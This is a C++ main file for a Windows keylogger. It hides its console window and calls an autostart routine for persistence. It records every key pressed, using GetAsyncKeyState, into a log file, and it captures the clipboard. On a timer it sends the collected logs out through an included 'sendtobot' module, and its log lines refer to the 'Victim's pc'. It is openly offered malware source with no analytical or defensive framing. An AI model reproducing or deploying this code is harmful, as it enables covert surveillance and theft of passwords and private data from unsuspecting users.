#include <iostream>
#include <Windows.h>
#include "keylogg.hpp"
#include "clipboard.hpp"
#include "specialKeys.hpp"
#include "sendtobot.hpp"


using namespace std;

int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	autostart();
	LOG("\n[" + GetTime() + "]### Victim's pc is running ###");
	send();
	char KEY = 'x';
	time_t start = clock();
	while (true) {
		Clipboard();
		Sleep(10);
		time_t stop = clock();
		if ((double)(stop - start) / CLOCKS_PER_SEC / 60 >= SENDING_FREQUENCY) {
			send(); 
			start = clock();
			LOG("\n[" + GetTime() + "]#|#Sent#|#");
		}	
		for (int KEY = 8; KEY <= 190; KEY++){
			if (GetAsyncKeyState(KEY) == -32767) {
				if (SpecialKeys(KEY) == false) {
					fstream LogFile;
					LogFile.open(LOGFILENAME, fstream::app);
					if (LogFile.is_open()) {
						LogFile << char(KEY);
						LogFile.close();
					}
				}
			}
		}
	}
	
}
